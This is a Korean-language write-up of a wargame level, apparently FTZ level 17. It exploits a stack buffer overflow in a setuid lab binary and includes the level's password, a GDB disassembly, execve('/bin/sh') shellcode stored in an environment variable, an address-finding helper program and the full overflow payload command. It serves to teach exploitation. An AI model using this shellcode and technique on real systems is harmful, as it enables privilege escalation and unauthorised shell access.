---
sort: 17
---

# Level 17

```note
id : level17

password : king poetic
```

hint를 보면 attackme의 소스코드가 나온다.<br>
attackme에 setuid가 걸려있으니 얘를 공격해보자.

```c
#include <stdio.h>
 
void printit() {
  printf("Hello there!\n");
}
 
main()
{ int crap;
  void (*call)()=printit;
  char buf[20];
  fgets(buf,48,stdin);
  setreuid(3098,3098);
  call();
}
```

GDB를 이용하여 attackme의 main함수를 disassemble했다.

<pre>
(gdb) disas main
Dump of assembler code for function main:
0x080484a8 (main+0):	push   %ebp
0x080484a9 (main+1):	mov    %esp,%ebp
0x080484ab (main+3):	sub    $0x38,%esp

<b>0x080484ae (main+6):	movl   $0x8048490,0xfffffff0(%ebp) </b>

0x080484b5 (main+13):	sub    $0x4,%esp
0x080484b8 (main+16):	pushl  0x804967c
0x080484be (main+22):	push   $0x30

<b>0x080484c0 (main+24):	lea    0xffffffc8(%ebp),%eax
0x080484c3 (main+27):	push   %eax
0x080484c4 (main+28):	call   0x8048350 (fgets) </b>

0x080484c9 (main+33):	add    $0x10,%esp
0x080484cc (main+36):	sub    $0x8,%esp
0x080484cf (main+39):	push   $0xc1a
0x080484d4 (main+44):	push   $0xc1a
0x080484d9 (main+49):	call   0x8048380 (setreuid)
0x080484de (main+54):	add    $0x10,%esp

<b>0x080484e1 (main+57):	mov    0xfffffff0(%ebp),%eax
0x080484e4 (main+60):	call   *%eax </b>

0x080484e6 (main+62):	leave  
0x080484e7 (main+63):	ret
</pre>

함수포인터인 call에 저장되어있는 printit 함수 주소를 libc에 있는 system함수로 바꾸는 방법을 사용해보려고 했으나, esp 위치가 좋지 않아서 불가능했다.<br>
그 대신 고정적인 위치에 shellcode를 올려놓은 후, shellcode가 있는 주소값으로 덮어씌우기로 했다.<br>
환경변수는 비교적 고정적인 위치를 가지고 있기 때문에 shellcode를 가진 환경변수를 등록한 후 주소를 가지고 와서 사용하기로 했다.

```bash
[level17@ftz tmp]$ export shellcode=$(python -c "print('\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80')")
```

환경변수의 주소값을 가져오기 위해 tmp폴더에서 아래와 같은 프로그램을 짰다.

```c
// vi shellcode.c
// gcc -o shellcode shellcode.c

#include <unistd.h>

int main(void)
{
        int p = getenv("shellcode");
        printf("%p\n", p);
        return 0;
}
```

가져온 환경변수의 주소값을 attackme에 알맞게 넣어주면 끝난다.

```bash
[level17@ftz tmp]$ ./shellcode 
0xbfffff02
[level17@ftz tmp]$ (python -c "print('A'*0x28+'\x02\xff\xff\xbf\n')";cat) | ../attackme
my-pass
```

```tip
## 알게 된 점

buffer overflow
```